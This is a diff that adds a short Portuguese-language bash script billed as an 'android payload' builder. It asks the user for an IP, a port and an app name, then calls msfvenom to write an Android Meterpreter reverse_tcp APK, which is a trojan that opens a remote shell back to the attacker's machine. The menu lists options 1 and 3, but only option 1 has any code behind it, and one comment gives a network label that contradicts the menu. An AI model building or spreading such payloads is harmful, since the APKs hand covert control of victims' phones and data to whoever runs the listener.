@@ -1,0 +1,23 @@
+#!/bin/bash
+echo "'''''''''''''''''''''''''''''''''''''"
+echo "ola seja bem vindo ao payload android"
+echo "'''''''''''''''''''''''''''''''''''''"
+echo "+=+=+=+=+=+=+=+=+=+="
+echo " [1]- rede externa"
+echo " [3]- rede interna "
+echo "+=+=+=+=+=+=+=+=+=+= "
+echo "qual opcao deseja executar ?"
+read opcao
+#CRINADO PAYLOAD ANDROID EM REDE INTERNA 
+if [ "$opcao" -eq "1"  ]
+then
+echo "digite seu ip interno (ETH0)"
+read interno
+echo "digite a porta aberta "
+read porta
+echo "digite o nome do aplicativo"
+read apk
+echo "CRIANDO PAYLOAD AGUARDE..."
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno LPORT=$porta R > $apk.apk
+echo "PAYLOAD CRIADO COM SUCESSO!"
+echo "OBRIGADO POR USAR ESSA FERRAMENTA"
